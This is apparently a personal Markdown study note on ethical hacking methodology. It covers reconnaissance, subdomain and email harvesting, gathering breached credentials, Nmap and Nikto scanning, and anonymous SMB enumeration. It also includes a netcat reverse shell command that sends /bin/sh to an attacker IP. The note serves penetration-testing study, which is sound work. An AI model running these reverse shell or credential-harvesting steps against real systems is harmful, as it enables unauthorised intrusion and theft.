# EH Methodology
1. [Reconnaissance](#reconnaissance): Active and Passive
2. [Scanning & Enumeration](#scanning--enumeration): Nmap, Nessus, Nikto
3. [Gaining Access](#gaining-access): Exploitation
4. [Maintaining Access](#maintaining-access)
5. [Covering Tracks](#covering-tracks)

## Reconnaissance
### Passive recon
#### Physical and social
Location information:
- Satellite images
- Drone recon
- Building layout (badge readers, break areas, security, fencing

Job information
- employees (name, job, title, phone, etc.)
- pictures (badge photo, desk photos, computer photos, etc.)

#### Web/Host
- Target Validatidation: WHOIS, nslookup, dnsrecon
- Finding subdomains: Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc.
- Fingerprinting: Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat
- Data breaches: HaveIBeenPwned, Breach-Parse, WeLeakInfo

### Identify target
Bug Bounty program: Bugcrowd
Choose a target and **check the scope**.  ! DO NOT TOUCH THE OUT OF SCOPE DOMAINS !

### Discovering Email Addresses
#### Get email addresses
- Tools: hunter.io, phonebook.cz, clearbit connect (Google app)

Get a list of email addresses of a company with name and job. 
NB: Find if there is a pattern. Ex: {X}{YYYY}@company.com with X being the first letter of firstname, and YYYY the first 4 letters of lastname. 

#### Check if addresses are valid 
Tools: tools.verifyemailaddress.io, email-check.net

### Gathering breached credentials 
Tools: breach-parse, DeHashed (not free)
Find any information email, password, hashed password
For hashed password: go to hashes.org 

### Subdomains
Search all interesting subdomains with the keywords dev, sso, vpn, api, admin, etc.
#### Sublist3r 
Works with Search Engine. Only third level searches like level3.level2.com 
```bash
apt install sublist3r
sublist3r -d [domain]
# use with -t THREAD to speed up depending on CPU power
```
#### crt.sh
Works with certificates. Search on any level like levelN.level3.level2.com 
Enter the following to search subdomains : `%.domain.com`
`%` acts as a wildcard.

#### OWASP Amass
Deep search. Install it via https://github.com/OWASP/Amass

#### httpprobe
Once you get the results, narrow the list down with https://github.com/tomnomnom/httprobe
It returns whether the website is up or down.

### Identifying website technologies
Identifying technologies to determine the version and see if there is any existing vulnerability 
#### builtwith.com
Determines what tech is used in a website (framework, libraries, widget, etc.)

#### wappalyzer (browser add-on)
Gives less information than builtwith.com but it gives you the information right away when you visit any page

#### whatweb (Kali built-in tool)
Not as pretty as above tools but might give more information like technology version that couldn't be retrieve from *builtwith.com* or *wappalyzer*

### Burp Suite
Configure proxy first. Go to browser Preferences > Network Proxy > Manual proxy
Then type *127.0.0.1* as HTTP proxy and port *8080*
OR use *foxy-proxy*
This tool can also be used to identify website technology, but all requests as well. It can read all the requests and edit them.
### Google Fu
https://blog.tryhackme.com/google-fu/
### Social Media
Use Social Media to find any information, pictures, videos that might be vulnerable like work pictures showing a badge etc..

## Scanning & Enumeration
### Scanning
#### Nmap
```bash
# Get all opened port
nmap -T4 -p- <IP address>

# Get more info about found ports
nmap -T4 -p port1,port2 -A <IP address>
```
#### Nikto
```bash
# Get vuln information on host
nikto -h [host]
```
> Currently not working with SSL
#### Nessus
Web app with great interface and great features like scheduled scanning but the app is not free
### Enumeration
#### http (80), https (443)
Tools: dirbuster, BurpSuite
#### smb (139, 445)
Tools: Metasploit
Command:
```bash
# Try with anonymous auth if you don't have any password
smbclient -L \\\\{IP address}\\
# If results, do 
smbclient \\\\{IP address}\\{repository name}
```
> if the prompt changes and you have `smb: \>` you're in and you can try any SMB command
#### ssh (22) 
## Exploitation Basics
### Reverse and Bind shell
To perform these attacks, we use the `nc` command (*netcat*). 
Reverse shell is when the target connects to the attacker like this :
```bash
# Attacker's machine
nc -lvp 4444
```
> l for listening, v for verbose, p for port
```
# Victim's machine
nc 192.168.156.1 4444 -e /bin/sh
```
> 192.168.156.1 is attacker's IP address
> e 
## Gaining Access
## Maintaining Access
## Covering Tracks

Read:
Darknet diaries
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTU0MjY2MDk5OCwxODE4MTc2MjE5LC0xMD
k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
MTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMTYyLC0xODMxMzM5OD
ksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0xMDA3NTEyMjA4LC01
MzM3MjY4NTFdfQ==
-->